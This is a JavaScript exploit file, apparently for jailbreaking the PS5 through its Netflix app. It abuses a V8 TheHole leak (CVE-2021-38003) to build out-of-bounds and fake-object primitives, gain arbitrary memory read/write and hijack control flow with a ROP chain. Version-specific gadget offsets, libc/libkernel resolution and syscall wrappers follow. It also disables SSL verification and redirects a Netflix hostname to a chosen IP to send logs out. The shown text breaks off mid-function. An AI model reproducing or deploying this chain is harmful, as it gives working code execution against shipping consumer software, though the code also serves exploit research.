// Netflix PS5 Exploit
// based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
// thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html

// #region WebSocket
const ws = {
    socket: null,
    init(ip, port, callback) {
        nrdp.gibbon._runConsole("/command ssl-peer-verification false");

        nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
            addresses: [ip],
            ttl: 3600000
        });

        this.socket = new nrdp.WebSocket(`wss://pwn.netflix.com:${port}`);
        this.socket.onopen = callback;
    },
    send(msg) {
        if (this.socket && this.socket.readyState !== this.socket.CLOSED) {
            this.socket.send(msg);
        }
    }
}
// #endregion
// #region Logger
const logger = {
    overlay: null,
    lines: [],
    maxLines: 40,
    refreshTimer: null,
    init() {
        this.overlay = nrdp.gibbon.makeWidget({
            name: "dbg",
            width: 1280,
            height: 720,
            backgroundColor: "#000000"
        });
    
        nrdp.gibbon.scene.overlay = this.overlay;
    },
    log(msg) {
        ws.send(msg);
        this.lines.push(msg);
        if (this.lines.length > this.maxLines) this.lines.shift();
        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
        this.refreshTimer = nrdp.setTimeout(() => {
            this.refresh();
            this.refreshTimer = null;
        }, 50);
    },
    refresh() {
        if (!this.overlay) return;
        if (this.overlay.children) {
            for (var j = this.overlay.children.length - 1; j >= 0; j--) {
                var child = this.overlay.children[j];
                if (child && child._name && child._name.startsWith("ln")) {
                    this.overlay.removeChild(child);
                }
            }
        }

        for (var i = 0; i < this.lines.length; i++) {
            var w = nrdp.gibbon.makeWidget({
                name: "ln" + i,
                x: 10,
                y: 10 + (i * 17),
                width: 1260,
                height: 15
            });
            
            w.text = {
                contents: this.lines[i],
                size: 12,
                color: {
                    a: 255,
                    r: 0,
                    g: 255,
                    b: 0
                },
                wrap: false
            };

            w.parent = this.overlay;
        }
    }
}
// #endregion
// #region Pointer Helpers
const buf = new ArrayBuffer(8);
const view = new DataView(buf);
const ptr = {
    il2ih(value) {
        return value << 0x20n;
    },
    ih2il(value) {
        return value >> 0x20n;
    },
    ih(value) {
        return value & ~0xFFFFFFFFn;
    },
    il(value) {
        return value & 0xFFFFFFFFn;
    },
    itag(value) {
    	return value | 1n;
    },
    iuntag(value) {
    	return value & ~1n;
    },
    f2i(value) {
        view.setFloat64(0, value, true);
        return view.getBigUint64(0, true);
    },
    f2ih(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(4, true));
    },
    f2il(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(0, true));
    },
    i2f(value) {
        view.setBigUint64(0, value, true);
        return view.getFloat64(0, true);
    },
    i2h(value, padded = true) {
        let str = value.toString(16).toUpperCase();
        if (padded) {
            str = str.padStart(16, '0');
        }
        return `0x${str}`;
    }
}
// #endregion

function make_hole () {
    let v1;
    function f0(v4) {
        v4(() => { }, v5 => {
            v1 = v5.errors;
        });
    }
    f0.resolve = function (v6) {
        return v6;
    };
    let v3 = {
        then(v7, v8) {
            v8();
        }
    };
    Promise.any.call(f0, [v3]);
    return v1[1];
}

function make_hole_old () {
    let a = [], b = [];
    let s = '"'.repeat(0x800000);
    a[20000] = s;

    for (let i = 0; i < 10; i++) a[i] = s;
    for (let i = 0; i < 10; i++) b[i] = a;

    try {
        JSON.stringify(b);
    } catch (hole) {
        return hole;
    }

    throw new Error('Could not trigger TheHole');
}

function hex(value)
{
  return "0x" + value.toString(16).padStart(8, "0");
}

class gadgets {
    constructor() {
        try {
            switch (nrdp.version.nova.app_version) {
                case 'Gemini-U6-2':         // EU 6.000
                    /** Gadgets for Function Arguments **/
                    this.pop_rax = 0x6c233n;
                    this.pop_rdi = 0x1a729bn;
                    this.pop_rsi = 0x14d8n;
                    this.pop_rdx = 0x3ec42n;
                    this.pop_rcx = 0x2485n;
                    this.pop_r8 = 0x6c232n;
                    this.pop_r9 = 0x66511bn;
                    
                    /** Other Gadgets **/
                    this.pop_rbp = 0x79n;
                    this.pop_rbx = 0x2e1ebn;
                    this.pop_rsp = 0x1df1e1n;
                    this.pop_rsp_pop_rbp = 0x17ecb4en;
                    this.mov_qword_ptr_rdi_rax = 0x1dcba9n;
                    break;
                case 'Gemini-U5-18':        // US 5.000
                    /** Gadgets for Function Arguments **/
                    this.pop_rax = 0x6c233n;
                    this.pop_rdi = 0x24f3c2n; // Changed
                    this.pop_rsi = 0x14d8n;
                    this.pop_rdx = 0x3ec42n;
                    this.pop_rcx = 0x2485n;
                    this.pop_r8 = 0x6c232n;
                    this.pop_r9 = 0x66511bn;
                    
                    /** Other Gadgets **/
                    this.pop_rbp = 0x79n;
                    this.pop_rbx = 0x2e1ebn;
                    this.pop_rsp = 0x13c719n; // Changed
                    this.pop_rsp_pop_rbp = 0x17ecb4en;
                    this.mov_qword_ptr_rdi_rax = 0x1dcba9n;
                    break;
                default:
                    throw new Error("App version not supported");
            }
        }
        catch (e) {
            throw new Error("App version not supported : " + e);
        }
    }
}

function main () {
    
    logger.init();
    
    logger.log("=== Netflix n Hack ===");

    try {

        const g = new gadgets(); // Load gadgets

        let hole = make_hole();

        let string = "TEXT";

        map1 = new Map();
        map1.set(1, 1);
        map1.set(hole, 1);

        map1.delete(hole);
        map1.delete(hole);
        map1.delete(1);

        oob_arr_temp = new Array(1.1, 2.2, 3.3); // Temporal due that cannot reach a bui64 with map
        oob_arr =  new BigUint64Array([0x4141414141414141n,0x4141414141414141n]);
        victim_arr = new BigUint64Array([0x5252525252525252n,0x5252525252525252n]);
        obj_arr = new Array({},{});

        map1.set(0x10, -1);
        nrdp.gibbon.garbageCollect();
        map1.set(oob_arr_temp, 0x200);
        
        // Let's make oob_arr oversize
        oob_arr_temp[18] = ptr.i2f(0x1000n*8n);  // Size in bytes
        oob_arr_temp[19]= ptr.i2f(0x1000n);      // Size in elements

        // From this point on we can use oob_arr as a more 'stable' primitive until fake objs

        // Elements ptr of victim_arr in first 32b of oob_arr[22]
        // external_ptr[0:31]   --> (oob_arr[25] & ~0xffffffffn) >> 32n
        // external_ptr[63:32]  --> (oob_arr[26] & 0xffffffffn) << 32n
        // base_ptr[0:31]       --> (oob_arr[26] & ~0xffffffffn) >> 32n
        // base_ptr[0:31]       --> (oob_arr[27] & 0xffffffffn) << 32n

        // Elements Ptr of obj_arr in lower 32b (first in mem) of oob_arr[37]
        // Value of obj_arr[0] (ptr to obj) in lower 32b (first in mem) of oob_arr[39]

        function addrof_unstable (obj) {
            obj_arr[0] = obj;
            return (oob_arr[39] & 0xffffffffn) -1n;
        }

        function create_fakeobj_unstable(add) {
            let add_32 = add & 0xffffffffn +1n;     // Just in case 32bits
            let original_value = oob_arr[39];   // Grab full 64bits add in oob_arr[41] to 'save' upper 32bits
            let new_value = (original_value & ~0xffffffffn) + ((add+1n) & 0xffffffffn);
            oob_arr[39] = new_value;
            const fake_obj = obj_arr[0];
            return fake_obj;
        }

        function read64_unstable (add) {
            let add_32 = add & 0xffffffffn;     // Just in case 32bits

            let original_value_25 = oob_arr[25];
            let original_value_26 = oob_arr[26];

            let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);
            
            oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
            oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0

            let read_value = victim_arr[0]; // Read the value

            oob_arr[25] = original_value_25;
            oob_arr[26] = original_value_26;

            return read_value;
        }

        function write64_unstable (add, value) {
            let add_32 = add & 0xffffffffn;     // Just in case 32bits

            let original_value_25 = oob_arr[25];
            let original_value_26 = oob_arr[26];

            let external_ptr_org_63_32 = (oob_arr[26] & 0xffffffffn);

            oob_arr[25] = (original_value_25 & 0xffffffffn) + (add_32 << 32n);
            oob_arr[26] = external_ptr_org_63_32; // re-use upper32 bits of heap from external_ptr, base_ptr 0

            victim_arr[0] = value;  // Write the value

            oob_arr[25] = original_value_25;
            oob_arr[26] = original_value_26;
        }     

        function read32_unstable(add){
            let read = read64_unstable(add);
            return read & 0xffffffffn;
        }

        function write32_unstable(add, value) {
            let read = read64_unstable(add);
            let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
            write64_unstable(add, new_value);
        }      
        
        
        let add_string = addrof_unstable(string) + 12n;
        logger.log("Address of 'string' text: " + hex(add_string));
        logger.log("Original value of 'string' (should be 0x54584554): 0x" + read32_unstable(add_string).toString(16) ) ;

        write32_unstable(add_string, 0x41414141n);
        logger.log("Overwritten value of 'string' (should be AAAA): " + string );
        
        let typed_arr = new Int8Array(8);
        let base_heap_add = read64_unstable(addrof_unstable(typed_arr) + 10n * 4n) & ~0xffffffffn;
        let top32b_heap = base_heap_add >> 32n;
        logger.log("Base heap address: " + hex(base_heap_add));
        logger.log("Top 32bits heap address: " + hex(top32b_heap));
        let leak_eboot_add = read64_unstable(0x28n); // Read at base heap + 0x28 (upper 32b are completed by v8)
        let eboot_base = leak_eboot_add - 0x8966C8n; // This is not realiable as the addess changes
        // Previously used offsets: 0x88C76En , 0x8966C8n
        // Seems to be a ptr that the app updates while running
        // If nothing is changed in the code before this point, it should not change
        logger.log("Leaked eboot add : " + hex(leak_eboot_add));
        logger.log("eboot base : " + hex(eboot_base));
        
        
        /***** Start of Stable Primitives based on fake obj *****/
        /*****        Base on code from Gezine Y2JB         *****/

        // Allocate Large Object Space with proper page metadata
        // Create object array first to initialize page structures
        const stable_array = new Array(0x8000);
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = {};
        }
  
        // Get FixedDoubleArray map from a template
        const double_template = new Array(0x10);
        double_template.fill(3.14);
        const double_template_addr = addrof_unstable(double_template);
        const double_elements_addr = read32_unstable(double_template_addr + 0x8n) - 1n;
        const fixed_double_array_map = read32_unstable(double_elements_addr + 0x00n);
        
        // Get stable_array addresses
        const stable_array_addr = addrof_unstable(stable_array);
        const stable_elements_addr = read32_unstable(stable_array_addr + 0x8n) - 1n;
              
        logger.log('Large Object Space @ ' + hex(stable_elements_addr));
        
        // Transform elements to FixedDoubleArray
        // This makes GC happy later
        write32_unstable(stable_elements_addr + 0x00n, fixed_double_array_map);
        
        logger.log('Converted stable_array to double array');
        
        for (let i = 0; i < stable_array.length; i++) {
            stable_array[i] = 0;
        }

        console.log("Reserved space filled with 0s");

        // Get templates for stable primitives

        /***** Template for BigUint64Array *****/
        const template_biguint = new BigUint64Array(64);

        const template_biguint_addr = addrof_unstable(template_biguint);
        const biguint_map =      read32_unstable(template_biguint_addr + 0x00n);
        const biguint_props =    read32_unstable(template_biguint_addr + 0x04n);
        const biguint_elements = read32_unstable(template_biguint_addr + 0x08n) - 1n;
        const biguint_buffer =   read32_unstable(template_biguint_addr + 0x0Cn) - 1n;
        
        const biguint_elem_map = read32_unstable(biguint_elements + 0x00n);
        const biguint_elem_len = read32_unstable(biguint_elements + 0x04n);

        const biguint_buffer_map =      read32_unstable(biguint_buffer + 0x00n);
        const biguint_buffer_props =    read32_unstable(biguint_buffer + 0x04n);
        const biguint_buffer_elem =     read32_unstable(biguint_buffer + 0x08n);
        const biguint_buffer_bitfield = read32_unstable(biguint_buffer + 0x24n);

        /***** Template for Object Array *****/
        const template_obj_arr = [{},{}];

        const template_obj_arr_addr = addrof_unstable(template_obj_arr);
        const obj_arr_map =      read32_unstable(template_obj_arr_addr + 0x00n);
        const obj_arr_props =    read32_unstable(template_obj_arr_addr + 0x04n);
        const obj_arr_elements = read32_unstable(template_obj_arr_addr + 0x08n) - 1n;
        const obj_arr_len =      read32_unstable(template_obj_arr_addr + 0x0Cn);
        
        const obj_arr_elem_map = read32_unstable(obj_arr_elements + 0x00n);
        const obj_arr_elem_len = read32_unstable(obj_arr_elements + 0x04n);

        logger.log('Templates extracted');


        const base = stable_elements_addr + 0x100n;

        /*******************************************************/
        /*****       Memory Layout for fake Objects        *****/
        /*******************************************************/
        /***** fake_rw header:          0x0000             *****/
        /***** fake_rw buffer:          0x0040             *****/
        /***** fake_rw elements:        0x1000             *****/
        /*******************************************************/
        /***** fake_bui64_arr header:   0x0100 (inside rw) *****/
        /***** fake_bui64_arr buffer:   0x0150 (inside rw) *****/
        /***** fake_bui64_arr elements: 0x1100             *****/
        /*******************************************************/
        /***** fake_obj_arr header:     0x0200 (inside rw) *****/
        /***** fake_obj_arr elements:   0x0250 (inside rw) *****/
        /*******************************************************/
       
        // Inside fake_rw_data: fake Array's elements (at the beginning)
        const fake_rw_obj = base + 0x0000n;
        const fake_rw_obj_buffer = base + 0x0040n;
        const fake_rw_obj_elements = base + 0x1000n;

        const fake_bui64_arr_obj = base + 0x0100n;
        const fake_bui64_arr_buffer = base + 0x0150n;
        const fake_bui64_arr_elements = base + 0x1100n;

        const fake_obj_arr_obj = base + 0x0200n;
        const fake_obj_arr_elements = base + 0x0250n;

        /*******************************************************************************************************/
        /**********                             Init Fake OOB BigUInt64Array                          **********/
        /*******************************************************************************************************/
        write32_unstable(fake_rw_obj_buffer + 0x00n, biguint_buffer_map);
        write32_unstable(fake_rw_obj_buffer + 0x04n, biguint_buffer_props);
        write32_unstable(fake_rw_obj_buffer + 0x08n, biguint_buffer_elem);
        write32_unstable(fake_rw_obj_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
        write32_unstable(fake_rw_obj_buffer + 0x14n, fake_rw_obj_elements + 8n +1n);  // backing_store lower 32b
        write32_unstable(fake_rw_obj_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
        write32_unstable(fake_rw_obj_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field

        write32_unstable(fake_rw_obj_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_rw_obj_elements + 0x04n, biguint_elem_len);  // Fake size in bytes

        write32_unstable(fake_rw_obj + 0x00n, biguint_map);
        write32_unstable(fake_rw_obj + 0x04n, biguint_props);
        write32_unstable(fake_rw_obj + 0x08n, fake_rw_obj_elements + 1n);
        write32_unstable(fake_rw_obj + 0x0Cn, fake_rw_obj_buffer + 1n);
        write64_unstable(fake_rw_obj + 0x18n, 0x8000n);      // Fake size in bytes
        write64_unstable(fake_rw_obj + 0x20n, 0x1000n);      // Fake size in elements
        write32_unstable(fake_rw_obj + 0x28n, fake_rw_obj_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_rw_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_rw_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_rw_obj + 0x34n, 0n);  // base_pointer upper 32b
        /*******************************************************************************************************/
        /**********                             End Fake OOB BigUInt64Array                           **********/
        /*******************************************************************************************************/

        /*******************************************************************************************************/
        /**********                             Init Fake Victim BigUInt64Array                       **********/
        /*******************************************************************************************************/
        write32_unstable(fake_bui64_arr_buffer + 0x00n, biguint_buffer_map);
        write32_unstable(fake_bui64_arr_buffer + 0x04n, biguint_buffer_props);
        write32_unstable(fake_bui64_arr_buffer + 0x08n, biguint_buffer_elem);
        write32_unstable(fake_bui64_arr_buffer + 0x0cn, 0x1000n*8n);      // byte_length lower 32b
        write32_unstable(fake_bui64_arr_buffer + 0x14n, fake_bui64_arr_elements + 8n +1n);  // backing_store lower 32b
        write32_unstable(fake_bui64_arr_buffer + 0x18n, top32b_heap);                    // backing_store upper 32b
        write32_unstable(fake_bui64_arr_buffer + 0x24n, biguint_buffer_bitfield);  // bit_field

        write32_unstable(fake_bui64_arr_elements + 0x00n, biguint_elem_map);
        write32_unstable(fake_bui64_arr_elements + 0x04n, biguint_elem_len);  // Fake size in bytes

        write32_unstable(fake_bui64_arr_obj + 0x00n, biguint_map);
        write32_unstable(fake_bui64_arr_obj + 0x04n, biguint_props);
        write32_unstable(fake_bui64_arr_obj + 0x08n, fake_bui64_arr_elements + 1n);
        write32_unstable(fake_bui64_arr_obj + 0x0Cn, fake_bui64_arr_buffer + 1n);
        write64_unstable(fake_bui64_arr_obj + 0x18n, 0x40n);      // Fake size in bytes
        write64_unstable(fake_bui64_arr_obj + 0x20n, 0x08n);      // Fake size in elements
        write32_unstable(fake_bui64_arr_obj + 0x28n, fake_bui64_arr_buffer + 16n*4n);  // external_pointer lower 32b
        write32_unstable(fake_bui64_arr_obj + 0x2Cn, top32b_heap);  // external_pointer upper 32b
        write32_unstable(fake_bui64_arr_obj + 0x30n, 0n);  // base_pointer lower 32b
        write32_unstable(fake_bui64_arr_obj + 0x34n, 0n);  // base_pointer upper 32b
        /*******************************************************************************************************/
        /**********                             End Fake Victim BigUInt64Array                        **********/
        /*******************************************************************************************************/

        /*******************************************************************************************************/
        /**********                             Init Fake Obj Array                                   **********/
        /*******************************************************************************************************/
        write32_unstable(fake_obj_arr_obj + 0x00n, obj_arr_map);
        write32_unstable(fake_obj_arr_obj + 0x04n, obj_arr_props);
        write32_unstable(fake_obj_arr_obj + 0x08n, fake_obj_arr_elements+1n);
        write32_unstable(fake_obj_arr_obj + 0x0cn, obj_arr_len);      // byte_length lower 32b

        write32_unstable(fake_obj_arr_elements + 0x00n, obj_arr_elem_map);
        write32_unstable(fake_obj_arr_elements + 0x04n, obj_arr_elem_len);  // size in bytes << 1
        /*******************************************************************************************************/
        /**********                             End Fake Obj Array                                    **********/
        /*******************************************************************************************************/

        // Materialize fake objects
        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
        let fake_rw_add = addrof_unstable(fake_rw);
        //log("This is the add of fake_rw materialized : " + hex(fake_rw_add));

        const fake_victim = create_fakeobj_unstable(fake_bui64_arr_obj);
        let fake_victim_add = addrof_unstable(fake_victim);
        //log("This is the add of fake_victim materialized : " + hex(fake_victim_add));

        const fake_obj_arr = create_fakeobj_unstable(fake_obj_arr_obj);
        let fake_obj_arr_add = addrof_unstable(fake_obj_arr);
        //log("This is the add of fake_obj_arr materialized : " + hex(fake_obj_arr_add));

        // Now we have OOB, Victim and Obj to make stable primitives

        function addrof (obj) {
          fake_obj_arr[0] = obj;
          return (fake_rw[59] & 0xffffffffn) - 1n;
        }


        /***** The following primitives r/w a compressed Add *****/
        /***** The top 32 bits are completed with top32b_heap *****/

        function read64 (add) {
          let add_32 = add & 0xffffffffn; // Just in case
          let original_value = fake_rw[21];
          fake_rw[21] = (top32b_heap<<32n) + add_32; // external_ptr of buffer
          let read_value = fake_victim[0];
          fake_rw[21] = original_value;
          return read_value;
        }

        function write64 (add, value) {
          let add_32 = add & 0xffffffffn; // Just in case
          let original_value = fake_rw[21];
          fake_rw[21] = (top32b_heap<<32n) + add_32; // external_ptr of buffer
          fake_victim[0] = value;
          fake_rw[21] = original_value;
        }

        function read32(add){
          let read = read64(add);
          return  read & 0xffffffffn;
        }

        function write32(add, value) {
          let read = read64(add);
          let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
          write64(add, new_value);
        }

        function read16(add){
          let read1 = read64(add);
          return  read1 & 0xffffn;
        }

        function write16(add, value) {
          let read = read64(add);
          let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
          write64(add, new_value);
        }

        function read8(add){
          let read = read64(add);
          return  read & 0xffn;
        }

        function write8(add, value) {
          let read = read64(add);
          let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
          write64(add, new_value);
        }

        /***** The following primitives r/w a full 64bits Add *****/        

        function read64_uncompressed (add) {
          let original_value = fake_rw[21];
          fake_rw[21] = add; // external_ptr of buffer
          let read_value = fake_victim[0];
          fake_rw[21] = original_value;
          return read_value;
        }

        function write64_uncompressed (add, value) {
          let original_value = fake_rw[21];
          fake_rw[21] = add; // external_ptr of buffer
          fake_victim[0] = value;
          fake_rw[21] = original_value;
        }

        function read32_uncompressed(add){
          let read = read642_uncompressed(add);
          return  read & 0xffffffffn;
        }

        function write32_uncompressed(add, value) {
          let read = read64_uncompressed(add);
          let new_value = (read & ~0xffffffffn) | (BigInt(value) & 0xffffffffn);
          write64_uncompressed(add, new_value);
        }

        function read16_uncompressed(add){
          let read = read64_uncompressed(add);
          return  read & 0xffffn;
        }

        function write16_uncompressed(add, value) {
          let read = read64_uncompressed(add);
          let new_value = (read & ~0xffffn) | (BigInt(value) & 0xffffn);
          write64_uncompressed(add, new_value);
        }

        function read8_uncompressed(add){
          let read = read64_uncompressed(add);
          return  read & 0xffn;
        }

        function write8_uncompressed(add, value) {
          let read = read64_uncompressed(add);
          let new_value = (read & ~0xffn) | (BigInt(value) & 0xffn);
          write64_uncompressed(add, new_value);
        }

        function get_backing_store(typed_array) {
          const obj_addr = addrof(typed_array);
          const external = read64(obj_addr + 0x28n);
          const base = read64(obj_addr + 0x30n);
          return base + external;
        }

        let allocated_buffers = [];

        function malloc (size) {
            const buffer = new ArrayBuffer(size);
            const buffer_addr = addrof(buffer);
            const backing_store = read64(buffer_addr + 0x14n);
            allocated_buffers.push(buffer);
            logger.log("Returned backing_store in malloc: " + hex(backing_store) );
            return backing_store;
        }

        logger.log("Stable Primitives Achieved.");

        const rop_chain = new BigUint64Array(0x1000);
        const rop_address = get_backing_store(rop_chain);
        logger.log("Address of ROP obj: " + hex(addrof(rop_chain)) );
        logger.log("Address of ROP: " + hex(rop_address) );

        function rop_smash (x) {
          let a = 100;
          return 0x1234567812345678n;
        }

        let value_delete = rop_smash(1); // Generate Bytecode

        add_rop_smash = addrof(rop_smash);
        logger.log("This is the add of function 'rop_smash': " + hex(add_rop_smash) );
        add_rop_smash_sharedfunctioninfo = read32(add_rop_smash + 0x0Cn) -1n;
        add_rop_smash_code = read32(add_rop_smash_sharedfunctioninfo + 0x04n) -1n;
        add_rop_smash_code_store = add_rop_smash_code + 0x22n;        

        const fake_frame = new BigUint64Array(8);     // Up to 8 * 8bytes are created inmediatly before the main Obj
        const add_fake_frame = addrof(fake_frame);
        const white_space_2 = new BigInt64Array(8);
        const white_space_3 = new BigInt64Array(8);
        logger.log("Address of fake_frame: 0x" + hex(add_fake_frame) );

        const fake_bytecode_buffer = new BigUint64Array(8);
        const add_fake_bytecode_store = get_backing_store(fake_bytecode_buffer);
        logger.log("Address of fake_bytecode_buffer: " + hex(addrof(fake_bytecode_buffer)) );
        logger.log("Address of add_fake_bytecode_store: " + hex(add_fake_bytecode_store) );

        const return_value_buffer = new BigUint64Array(8);
        const return_value_addr = get_backing_store(return_value_buffer);
        logger.log("Address of return_value_buffer: " + hex(addrof(return_value_buffer)) );
        logger.log("Address of return_value_buffer_store: " + hex(return_value_addr) );

        fake_bytecode_buffer[0] = 0xABn;
        fake_bytecode_buffer[1] = 0x00n;
        fake_bytecode_buffer[2] = 0x00n;    // Here is the value of RBP , force 0

        /*
        Address	    Instruction
        734217FB	jmp 0x73421789
        734217FD	mov rbx, qword ptr [rbp - 0x20] --> Fake Bytecode buffer on rbx
        73421801	mov ebx, dword ptr [rbx + 0x17] --> Fake Bytecode buffer + 0x17 (part of fake_bytecode[2])
        73421804	mov rcx, qword ptr [rbp - 0x18] --> Value forced to 0xff00000000000000
        73421808	lea rcx, [rcx*8 + 8]
        73421810	cmp rbx, rcx
        73421813	jge 0x73421818                  --> Because of forced value, it jumps right to the leave
        73421815	mov rbx, rcx
        73421818	leave
        73421819	pop rcx
        7342181A	add rsp, rbx                    --> RBX should be 0 here
        7342181D	push rcx
        7342181E	ret
        */

        write64(add_fake_frame  - 0x20n, add_fake_bytecode_store);  // Put the return code (by pointer) in R14
                                                                    // this is gonna be offseted by R9
        write64(add_fake_frame  - 0x28n, 0x00n);                    // Force the value of R9 = 0                                                                          
        write64(add_fake_frame  - 0x18n, 0xff00000000000000n); // Fake value for (Builtins_InterpreterEntryTrampoline+286) to skip break * Builtins_InterpreterEntryTrampoline+303
                                                                          
        write64(add_fake_frame + 0x08n, eboot_base + g.pop_rsp); // pop rsp ; ret --> this change the stack pointer to your stack
        write64(add_fake_frame + 0x10n, rop_address);

        // This function is calling a given function address and takes all arguments
        // Returns the value returned by the called function
        function call_rop (address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            
            write64(add_rop_smash_code_store, 0xab0025n);
            real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n; // We only leak lower 32bits, stack seems always be at upper 32bits 0x7
                                                                    // Value is tagged, remove 1n
                                                                    // Seems offseted by 2 bytes

            let i = 0;

            // Syscall Number (Syscall Wrapper)
            rop_chain[i++] = eboot_base + g.pop_rax;
            rop_chain[i++] = rax;

            // Arguments
            rop_chain[i++] = eboot_base + g.pop_rdi;
            rop_chain[i++] = arg1;
            rop_chain[i++] = eboot_base + g.pop_rsi;
            rop_chain[i++] = arg2;
            rop_chain[i++] = eboot_base + g.pop_rdx;
            rop_chain[i++] = arg3;
            rop_chain[i++] = eboot_base + g.pop_rcx;
            rop_chain[i++] = arg4;
            rop_chain[i++] = eboot_base + g.pop_r8;
            rop_chain[i++] = arg5;
            rop_chain[i++] = eboot_base + g.pop_r9;
            rop_chain[i++] = arg6;

            // Call Syscall Wrapper / Function
            rop_chain[i++] = address;

            // Store return value to return_value_addr
            rop_chain[i++] = eboot_base + g.pop_rdi;
            rop_chain[i++] = return_value_addr;
            rop_chain[i++] = eboot_base + g.mov_qword_ptr_rdi_rax;

            // Return to JS
            rop_chain[i++] = eboot_base + g.pop_rax;
            rop_chain[i++] = 0x2000n;                   // Fake value in RAX to make JS happy
            rop_chain[i++] = eboot_base + g.pop_rsp_pop_rbp;
            rop_chain[i++] = real_rbp;
            
            write64(add_rop_smash_code_store, 0xab00260325n);
            oob_arr[39] = add_fake_frame;
            rop_smash(obj_arr[0]);          // Call ROP

            //return BigInt(return_value_buffer[0]); // Return value returned by function
            // Seems like this is not being executed
        }

        function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
            return return_value_buffer[0];
        }

        /***** LibC *****/
        const libc_base = read64_uncompressed(eboot_base + 0x241F2B0n) - 0x1C0n;
        logger.log("libc base : " + hex(libc_base));
        const gettimeofdayAddr = read64_uncompressed(libc_base + 0x10f998n);
        logger.log("gettimeofdayAddr : " + hex(gettimeofdayAddr));
        const syscall_wrapper = gettimeofdayAddr + 0x7n;
        logger.log("syscall_wrapper : " + hex(syscall_wrapper));
        const sceKernelGetModuleInfoFromAddr = read64_uncompressed(libc_base + 0x10fa88n);

        const mod_info = malloc(0x300);
        const SEGMENTS_OFFSET = 0x160n;
        
        ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
        logger.log("sceKernelGetModuleInfoFromAddr returned: " + hex(ret));

        if (ret !== 0x0n) {
            logger.log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + hex(ret));
            throw new Error("sceKernelGetModuleInfoFromAddr failed");
        }
        
        /***** LibKernel *****/
        libkernel_base = read64_uncompressed(mod_info + SEGMENTS_OFFSET);
        logger.log("libkernel_base @ " + hex(libkernel_base));

        function syscall(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) 
        {
            logger.log("Enter syscall syscall_num : " + hex(syscall_num) );
            logger.log("Enter syscall arg1 : " + hex(arg1) );
            logger.log("Enter syscall arg2 : " + hex(arg2) );
            logger.log("Enter syscall arg3 : " + hex(arg3) );
            
            call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
            
            return_value = return_value_buffer[0];
            logger.log("Returning from rop - value: " + hex(return_value));
            return return_value;
        }
        
        let SYSCALL = {
            read: 0x3n,
            write: 0x4n,
            open: 0x5n,
            close: 0x6n,
            getuid: 0x18n,
            getsockname: 0x20n,
            accept: 0x1en,
            socket: 0x61n,
            connect: 0x62n,
            bind: 0x68n,
            setsockopt: 0x69n,
            listen: 0x6an,
            getsockopt: 0x76n,
            sysctl: 0xcan,
            netgetiflist: 0x7dn,
        };

        const O_RDONLY = 0n;
        const O_WRONLY = 1n;
        const O_RDWR = 2n;
        const O_CREAT = 0x100n;
        const O_TRUNC = 0x1000n;
        const O_APPEND = 0x2000n;
        const O_NONBLOCK = 0x4000n;

        function write_string(addr, str) {
            //const encoder = new TextEncoder();
            //const bytes = encoder.encode(str);
            
            const add_of_str = addrof(str) + 12n;
            
            for (let i = 0; i < str.length; i++) {
                byte = read8(add_of_str + BigInt(i));
                write8_uncompressed(addr + BigInt(i), byte);
            }
            
            write8_uncompressed(addr + BigInt(str.length), 0);
        }

        function alloc_string(str) {
            //const encoder = new TextEncoder();
            //const bytes = encoder.encode(str);
            
            const add_of_str = addrof(str) + 12n;;
            const addr = malloc(str.length + 1); // Full 64bits Add
            
            for (let i = 0; i < str.length; i++) {
                byte = read8(add_of_str + BigInt(i));
                write8_uncompressed(addr + BigInt(i), byte);
            }
            
            write8_uncompressed(addr + BigInt(str.length), 0);
            
            return addr;
        }

        function send_notification(text) {
            const notify_buffer_size = 0xc30n;
            const notify_buffer = malloc(Number(notify_buffer_size));
            const icon_uri = "cxml://psnotification/tex_icon_system";
                                
            // Setup notification structure
            write32_uncompressed(notify_buffer + 0x0n, 0);           // type
            write32_uncompressed(notify_buffer + 0x28n, 0);          // unk3
            write32_uncompressed(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
            write32_uncompressed(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
            
            // Write message at offset 0x2D
            write_string(notify_buffer + 0x2dn, text);
            
            // Write icon URI at offset 0x42D
            write_string(notify_buffer + 0x42dn, icon_uri);
            
            // Open /dev/notification0
            const dev_path = alloc_string("/dev/notification0");
